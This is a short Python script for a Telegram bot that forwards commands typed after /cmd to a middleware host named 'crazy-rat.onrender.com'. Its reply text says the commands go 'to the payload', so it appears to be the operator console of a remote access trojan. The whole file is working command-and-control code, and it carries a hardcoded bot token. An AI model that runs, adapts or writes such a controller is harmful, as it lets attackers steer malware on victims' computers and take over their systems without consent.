from telegram.ext import Updater, CommandHandler, MessageHandler, filters
import requests

# Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7557926778:AAH74UZc7JB5KSa0tJWRjqlBDlFDeEruog8"
MIDDLEWARE_URL = "https://crazy-rat.onrender.com"

def start(update, context):
    update.message.reply_text("Connected to the middleware. Send commands to the payload!")

def send_command(update, context):
    command = ' '.join(context.args)
    if command:
        # Forward the command to the middleware
        response = requests.post(MIDDLEWARE_URL, json={"command": command})
        update.message.reply_text(f"Command sent: {response.text}")
    else:
        update.message.reply_text("Please provide a command after /cmd")

def main():
    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("cmd", send_command))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
